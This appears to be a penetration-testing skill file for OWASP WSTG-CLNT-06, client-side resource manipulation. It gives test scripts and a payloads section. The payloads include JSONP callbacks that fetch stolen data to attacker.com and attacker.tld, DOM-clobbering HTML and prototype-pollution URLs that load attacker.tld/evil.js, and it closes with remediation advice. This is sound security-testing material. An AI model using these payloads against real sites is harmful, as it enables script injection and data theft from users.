---
name: wstg-clnt-06
description: "Testing for Client-Side Resource Manipulation"
category: client-side
owasp_id: WSTG-CLNT-06
version: "1.0.0"
author: cyberstrike-official
tags: [client-side, javascript, dom, cors, wstg, clnt]
tech_stack: []
cwe_ids: [CWE-200]
chains_with: [wstg-clnt-10, wstg-clnt-01]
prerequisites: [wstg-conf-03, wstg-conf-06]
severity_boost:
  wstg-clnt-01: "Attacker-controlled `<script src>` loading is equivalent to a guaranteed DOM XSS primitive since the attacker fully owns the executed code rather than just an injected fragment — Critical session/account takeover"
  wstg-clnt-10: "Resource manipulation controlling the WebSocket endpoint URL = attacker redirects the app's real-time channel to an attacker-controlled WS server, enabling live interception/tampering of all subsequent authenticated traffic — Critical"
---

# wstg-clnt-06

## Test ID

WSTG-CLNT-06

## Test Name

Testing for Client-Side Resource Manipulation

## High-Level Description

Client-side resource manipulation occurs when attackers can control what resources (scripts, styles, images) a page loads. This can lead to loading malicious scripts, defacement, or data theft by manipulating URLs of external resources.

---

## What to Check

- [ ] Dynamic script loading
- [ ] User-controlled src attributes
- [ ] JSONP endpoints
- [ ] Dynamic CSS loading
- [ ] iframe src manipulation

---

## How to Test

### Step 1: Test Script Source Manipulation

```bash
#!/bin/bash
TARGET="https://target.com"

# Check if script sources can be manipulated
curl -s "$TARGET/page?script=https://evil.com/malicious.js" | grep -i "script.*src"
curl -s "$TARGET/page?callback=alert" | grep -i "callback"
```

### Step 2: JSONP Exploitation

```javascript
// If JSONP callback can be controlled:
// https://target.com/api/data?callback=stealData

function stealData(data) {
  // Send data to attacker
  fetch("https://attacker.com/log?data=" + JSON.stringify(data))
}
```

### Step 3: Resource Manipulation Tester

```python
#!/usr/bin/env python3
import requests
import re

class ResourceManipulationTester:
    def __init__(self, base_url):
        self.base_url = base_url
        self.findings = []

    def test_script_injection(self, endpoint, param):
        """Test if external scripts can be loaded"""
        print(f"[*] Testing script source manipulation")

        payload = "https://evil.com/malicious.js"
        response = requests.get(
            f"{self.base_url}{endpoint}",
            params={param: payload}
        )

        if f'src="{payload}"' in response.text or f"src='{payload}'" in response.text:
            print(f"[VULN] Script source manipulation possible")
            self.findings.append({
                "issue": "External script loading",
                "severity": "High"
            })

    def test_jsonp(self, endpoint):
        """Test JSONP callback manipulation"""
        print(f"[*] Testing JSONP callback")

        response = requests.get(
            f"{self.base_url}{endpoint}",
            params={"callback": "alert"}
        )

        if "alert(" in response.text:
            print(f"[VULN] JSONP callback controllable")
            self.findings.append({
                "issue": "JSONP callback manipulation",
                "severity": "Medium"
            })

# Usage
tester = ResourceManipulationTester("https://target.com")
tester.test_script_injection("/page", "src")
tester.test_jsonp("/api/data")
```

---

## Tools

| Tool               | Purpose                                            |
| ------------------- | ----------------------------------------------------- |
| **Burp Suite**       | Fuzz resource-URL parameters, intercept loaded scripts   |
| **Browser DevTools** | Inspect Network tab for unexpected cross-origin resources |
| **OWASP ZAP**        | Automated scan for controllable `src`/`href` parameters   |

---

## Example Commands/Payloads

### Script/resource source manipulation

```bash
TARGET="https://{target}"
curl -s "$TARGET/page?script=https://attacker.tld/malicious.js" | grep -i "script.*src"
curl -s "$TARGET/page?css=https://attacker.tld/malicious.css" | grep -i "link.*href"
curl -s "$TARGET/page?iframe=https://attacker.tld/phish.html" | grep -i "iframe.*src"
```

### JSONP callback abuse

```
GET /api/data?callback=alert HTTP/1.1
Host: {target}
```

```javascript
// Malicious callback hosted on attacker.tld
function stealData(data) {
  fetch("https://attacker.tld/log?data=" + encodeURIComponent(JSON.stringify(data)))
}
```
```html
<script src="https://{target}/api/data?callback=stealData"></script>
```

### DOM Clobbering a resource-loading config variable

If `{target}`'s JS reads a global config object for the CDN/script URL only after checking `typeof window.config !== 'undefined'`, injected HTML (via any HTML-injection point, not just script tags) can "clobber" that global into an attacker-controlled value before the real script runs:

```html
<a id=config><a id=config name=scriptSrc href="https://attacker.tld/evil.js">
<!-- window.config.scriptSrc now resolves to "https://attacker.tld/evil.js" -->
```

```html
<!-- 3-levels-deep clobbering: window.config.cdn.url -->
<form id=config name=cdn><input id=url></form>
<form id=config></form>
```

### Client-side prototype pollution redirecting resource loads

```javascript
// If a merge of URL/hash-derived data into an options object is unguarded, pollute
// the property a script/stylesheet loader later reads for its source URL
https://{target}/#__proto__[cdnUrl]=https://attacker.tld/evil.js
https://{target}/?__proto__[scriptSrc]=https://attacker.tld/evil.js
```

```javascript
// Manual confirmation in DevTools console on {target}
Object.prototype.cdnUrl = "https://attacker.tld/evil.js"
// reload / trigger the resource-loading code path and check Network tab for the request
```

---

## Remediation

```javascript
// Validate resource URLs
const ALLOWED_DOMAINS = ["cdn.example.com", "static.example.com"]

function loadScript(url) {
  try {
    const parsed = new URL(url)
    if (ALLOWED_DOMAINS.includes(parsed.hostname)) {
      const script = document.createElement("script")
      script.src = url
      document.body.appendChild(script)
    }
  } catch (e) {
    console.error("Invalid URL")
  }
}

// Use CSP to restrict resource loading
// Content-Security-Policy: script-src 'self' cdn.example.com
```

---

## Risk Assessment

| Finding                     | CVSS | Severity |
| --------------------------- | ---- | -------- |
| External script loading     | 8.6  | High     |
| JSONP callback manipulation | 6.1  | Medium   |


---

## CWE Categories

| CWE ID | Title | Description |
| --- | --- | --- |
| **CWE-829** | Inclusion of Functionality from Untrusted Control Sphere | Client-side script loads resources (JS/JSONP/manifest) from attacker-influenced locations |
| **CWE-346** | Origin Validation Error | Resource references not validated against expected origin |

---

## References

- [OWASP WSTG - Testing for Client-side Resource Manipulation (WSTG-CLNT-06)](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/11-Client-side_Testing/06-Testing_for_Client-side_Resource_Manipulation)
- [OWASP Content Security Policy Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html)
- [PayloadsAllTheThings - CSP Bypass](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CSP%20Bypass)
- [PayloadsAllTheThings - Prototype Pollution](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Prototype%20Pollution)
- [PayloadsAllTheThings - DOM Clobbering](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/DOM%20Clobbering)

---

## Checklist

```
[ ] Script sources analyzed
[ ] JSONP endpoints tested
[ ] iframe sources checked
[ ] CSS sources tested
[ ] Findings documented
```
